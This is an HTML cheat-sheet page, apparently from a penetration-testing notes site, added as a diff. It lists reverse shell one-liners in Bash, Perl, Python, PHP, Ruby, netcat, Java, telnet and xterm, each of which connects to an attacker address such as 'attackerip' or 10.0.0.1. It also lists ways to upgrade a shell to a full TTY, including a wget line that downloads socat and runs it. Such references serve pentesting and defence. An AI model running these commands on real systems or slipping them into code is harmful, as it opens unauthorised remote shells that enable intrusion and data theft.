@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Reverseshells - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Reverse Shell OneLiners", url: "#_top", children: [
+              {title: "Reverse Shells", url: "#reverse-shells" },
+          ]},
+          {title: "/usr/openwin/bin/xterm -display attackerip:1", url: "#usropenwinbinxterm-display-attackerip1", children: [
+          ]},
+          {title: "Shell Upgrades", url: "#shell-upgrades", children: [
+              {title: "Method 1: Python pty module", url: "#method-1-python-pty-module" },
+              {title: "Method 2: Using socat", url: "#method-2-using-socat" },
+              {title: "Method 3: Upgrading from netcat with magic", url: "#method-3-upgrading-from-netcat-with-magic" },
+              {title: "Method 4: Using script", url: "#method-4-using-script" },
+              {title: "Method 5: Using Other Scripting Languages", url: "#method-5-using-other-scripting-languages" },
+              {title: "Method 6: Using socat one-liner", url: "#method-6-using-socat-one-liner" },
+              {title: "Method 7: Using Expect", url: "#method-7-using-expect" },
+              {title: "Method 8: Using rlwrap", url: "#method-8-using-rlwrap" },
+              {title: "References", url: "#references" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h2 id="reverse-shell-oneliners">Reverse Shell OneLiners</h2>
+<p>Spawn, catch &amp; upgrade reverse shells</p>
+<h3 id="reverse-shells">Reverse Shells</h3>
+<h4 id="bash"><strong>Bash</strong></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.0.1/8080<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></code></pre></div>
+<p><strong>Alternatives for Bash shell:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">exec</span><span class="w"> </span>/bin/bash<span class="w"> </span><span class="m">0</span><span class="p">&amp;</span><span class="m">0</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">0</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span><span class="w"> </span><span class="m">196</span>&lt;&gt;/dev/tcp/attackerip/4444<span class="p">;</span><span class="w"> </span>sh<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">exec</span><span class="w"> </span><span class="m">5</span>&lt;&gt;/dev/tcp/attackerip/4444
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>cat<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>line<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nv">$line</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w">  </span><span class="c1"># or:</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>line<span class="w"> </span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nv">$line</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</span></code></pre></div>
+<h4 id="perl"><strong>PERL</strong></h4>
+<div class="language-perl highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+</span></code></pre></div>
+<p><strong>Shorter Perl reverse shell that does not depend on /bin/sh:</strong></p>
+<div class="language-perl highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></code></pre></div>
+<p><strong>If the target system is running Windows use the following one-liner:</strong></p>
+<div class="language-perl highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></code></pre></div>
+<h4 id="python"><strong>Python</strong></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</span></code></pre></div>
+<h4 id="php"><strong>PHP</strong></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+</span></code></pre></div>
+<h4 id="ruby"><strong>Ruby</strong></h4>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
+</span></code></pre></div>
+<p>Longer Ruby reverse shell that does not depend on /bin/sh:</p>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+</span></code></pre></div>
+<p>If the target system is running Windows use the following one-liner:</p>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+</span></code></pre></div>
+<h4 id="netcat"><strong>Netcat</strong></h4>
+<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">1234</span>
+</span></code></pre></div>
+<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;/tmp/f
+</span></code></pre></div>
+<p>Other nc alternatives:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nc<span class="w"> </span>-c<span class="w"> </span>/bin/sh<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/bin/sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/p<span class="p">;</span><span class="w"> </span>mknod<span class="w"> </span>/tmp/p<span class="w"> </span>p<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>nc<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="m">0</span>/tmp/p
+</span></code></pre></div>
+<h4 id="java"><strong>Java</strong></h4>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">)</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
+</span></code></pre></div>
+<h4 id="telnet"><strong>Telnet</strong></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/p<span class="p">;</span><span class="w"> </span>mknod<span class="w"> </span>/tmp/p<span class="w"> </span>p<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>telnet<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="m">0</span>/tmp/p
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>telnet<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span>attackerip<span class="w"> </span><span class="m">4445</span><span class="w">   </span><span class="c1"># Remember to listen on your machine also on port 4445/tcp</span>
+</span></code></pre></div>
+<h4 id="xterm"><strong>xterm</strong></h4>
+<p>The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>xterm -display 10.0.0.1
+</span></code></pre></div>
+  <em>Or:</em></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>$ DISPLAY=attackerip:0 xterm
+</span></code></pre></div>
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Xnest :1
+</span></code></pre></div>
+<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>xhost +targetip
+</span></code></pre></div>
+<p>Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:</p>
+<h2 id="usropenwinbinxterm-display-attackerip1"><div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/usr/openwin/bin/xterm -display attackerip:1
+</span></code></pre></div></h2>
+<h2 id="shell-upgrades">Shell Upgrades</h2>
+<h4 id="method-1-python-pty-module">Method 1: Python pty module</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span></code></pre></div>
+<h4 id="method-2-using-socat">Method 2: Using socat</h4>
+<p>On attack machine (listen):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>socat<span class="w"> </span>file:<span class="se">\`</span>tty<span class="se">\`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:4444
+</span></code></pre></div>
+<p>On Victim (launch):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>socat<span class="w"> </span>exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:10.0.3.4:4444
+</span></code></pre></div>
+<h4 id="method-3-upgrading-from-netcat-with-magic">Method 3: Upgrading from netcat with magic</h4>
+<p>In reverse shell:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span></code></pre></div>
+<p>On attack machine:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="nb">fg</span>
+</span></code></pre></div>
+<p>In reverse shell:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>reset
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>stty<span class="w"> </span>rows<span class="w"> </span>&lt;num&gt;<span class="w"> </span>columns<span class="w"> </span>&lt;cols&gt;
+</span></code></pre></div>
+<h4 id="method-4-using-script">Method 4: Using script</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null
+</span></code></pre></div>
+<h4 id="method-5-using-other-scripting-languages">Method 5: Using Other Scripting Languages</h4>
+<p>Perl:</p>
+<div class="language-perl highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
+</span></code></pre></div>
+<p>Ruby:</p>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;exec &quot;/bin/sh&quot;&#39;</span>
+</span></code></pre></div>
+<p>Lua:</p>
+<div class="language-lua highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;os.execute(&#39;/bin/sh&#39;)&quot;</span>
+</span></code></pre></div>
+<h4 id="method-6-using-socat-one-liner">Method 6: Using socat one-liner</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>wget<span class="w"> </span>-q<span class="w"> </span>https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat<span class="w"> </span>-O<span class="w"> </span>/dev/shm/socat<span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/dev/shm/socat<span class="p">;</span><span class="w"> </span>/dev/shm/socat<span class="w"> </span>exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:10.0.15.100:4444
+</span></code></pre></div>
+<h4 id="method-7-using-expect">Method 7: Using Expect</h4>
+<p>Create a script called sh.exp:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="ch">#!/usr/bin/expect</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>spawn<span class="w"> </span>sh
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>interact
+</span></code></pre></div>
+<p>Then, execute this script on the victim machine.</p>
+<h4 id="method-8-using-rlwrap">Method 8: Using rlwrap</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp
+</span></code></pre></div>
+<p>—</p>
+<h4 id="references">References</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>1. Reverse Shell Cheat Sheet | pentestmonkey. (n.d.). https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>2. Reverse shells one-liners. (n.d.). https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html?m=1
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>3. ropnop blog. https:// blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>4. zweilosec. https://zweilosec.github.io/posts/upgrade-linux-shell/
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>5. 0xffsec. https://0xffsec.com/handbook/shells/full-tty/
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/reverseshells.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
